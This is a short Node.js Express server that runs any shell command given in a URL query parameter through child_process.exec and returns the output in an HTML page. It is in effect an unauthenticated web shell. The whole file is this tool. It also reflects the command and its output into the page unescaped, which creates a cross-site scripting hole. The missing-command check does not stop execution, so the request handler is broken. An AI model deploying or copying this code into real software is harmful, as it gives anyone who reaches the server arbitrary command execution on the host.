const util = require('util')
const exec = util.promisify(require('child_process').exec)

// required express stuff
const express = require('express')
const app = express()
const router = express.Router()

// main page get request handler
router.get('/', function (req, res) {
  const { command } = req.query

  !command && res.status(400).send({ message: 'pass a command come on!' })

  runShell(command).then(r => {
    // return an html form by which we can submit commands 
    // plus a pre tag which holds the result text of the running command
    res.write(`<div><form action="/"><input style="width:100%" autofocus name="command" value="${command}"/></form></div><pre>${r}</pre>`)
    res.end()
  })
})

//add the / router
app.use('/', router)

// start listening on given port
app.listen(process.env.port || 3000)
console.log('Running at Port 3000')

// function that runs shell commands using exec function
const runShell = async command => {
  try {
    const { stdout, stderr, error } = await exec(command);
    stdout && console.log('stdout:', stdout);
    stderr && console.log('stderr:', stderr);
    return stdout || stderr
  } catch (e) {
    console.error(e); // should contain code (exit code) and signal (that caused the termination).
    return e.message
  }
}
